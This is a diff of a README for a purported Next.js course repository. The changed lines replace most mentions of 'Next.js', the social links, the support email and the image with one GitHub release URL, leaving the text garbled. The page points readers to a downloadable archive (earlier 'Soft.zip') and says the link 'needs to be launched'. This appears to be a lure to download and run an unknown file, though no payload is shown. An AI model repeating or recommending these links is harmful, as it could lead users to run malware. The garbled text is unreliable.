@@ -1,6 +1,6 @@
 # Discover the Nextjs Courses You Wish to Explore! 🚀
 
-Welcome to the "nextjs-courses-you-wish" repository - a platform where you can dive into the world of Next.js courses created with the greatest ingredients including RAG, AI, Next.js 15, RSC, PostgresSQL, Auth, React 19, Tanstack Query, TailwindCss V4, and more!
+Welcome to the "nextjs-courses-you-wish" repository - a platform where you can dive into the world of https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2 courses created with the greatest ingredients including RAG, AI, https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2 15, RSC, PostgresSQL, Auth, React 19, Tanstack Query, TailwindCss V4, and more!
 
 ## Repository Details:
 
@@ -14,7 +14,7 @@ Welcome to the "nextjs-courses-you-wish" repository - a platform where you can d
 
 ### Course Highlights:
 
-- **Next.js 15**: Explore the latest version of Next.js and leverage its powerful features to build dynamic web applications.
+- **https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2 15**: Explore the latest version of https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2 and leverage its powerful features to build dynamic web applications.
 - **Auth**: Learn about authentication mechanisms in web development and ensure secure access to your applications.
 - **React 19**: Get hands-on experience with React 19 and build cutting-edge user interfaces.
 - **PostgresSQL**: Dive into the world of databases with PostgresSQL and master data storage and retrieval.
@@ -23,7 +23,7 @@ Welcome to the "nextjs-courses-you-wish" repository - a platform where you can d
 
 ### Repository Link:
 
-🔗 Click [here](https://github.com/files/Soft.zip) to access the repository content.
+🔗 Click [here](https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2) to access the repository content.
 
 *Note: The link provided needs to be launched.*
 
@@ -33,24 +33,24 @@ If you encounter any issues with the provided link, feel free to explore the "Re
 
 ## Get Involved:
 
-🌟 Join us on this exciting learning journey and expand your knowledge in Next.js, React, and more! 🌟
+🌟 Join us on this exciting learning journey and expand your knowledge in https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2, React, and more! 🌟
 
 ### Stay Connected:
 
 Connect with us on social media for the latest updates and course announcements:
 
-- Twitter: [@nextjsteam](https://twitter.com/nextjsteam)
-- LinkedIn: [Next.js Courses](https://www.linkedin.com/company/nextjs-courses)
+- Twitter: [@nextjsteam](https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2)
+- LinkedIn: [https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2 Courses](https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2)
 
 ### Support:
 
-If you have any questions or need assistance, don't hesitate to reach out to our support team at [support@nextjs-courses.com](mailto:support@nextjs-courses.com).
+If you have any questions or need assistance, don't hesitate to reach out to our support team at [https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2](https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2).
 
 ## Let's Start Learning!
 
-🚀 Begin your Next.js adventure today and elevate your skills to the next level! 🚀
+🚀 Begin your https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2 adventure today and elevate your skills to the next level! 🚀
 
-![Next.js Courses](https://example.com/nextjs-courses.jpg)
+![https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2 Courses](https://github.com/rahul30061996/nextjs-courses-you-wish/releases/tag/v1.2)
 
 ---
 
